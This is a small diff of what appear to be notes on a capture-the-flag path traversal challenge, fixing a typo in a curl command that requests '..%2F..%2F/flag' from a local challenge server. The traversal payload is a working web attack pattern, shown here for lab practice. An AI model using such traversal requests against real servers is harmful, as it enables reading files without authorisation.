@@ -29,7 +29,7 @@ II WAY -> curl
 -clicked start
 -opened the terminal
 -ran: '/challenge/server'
--ran: 'curl -v "http://challenge.localhost/deliverbales/..%2F..%2F/flag"'
+-ran: 'curl -v "http://challenge.localhost/deliverables/..%2F..%2F/flag"'
 -flag popped out
 
 III WAY -> browser
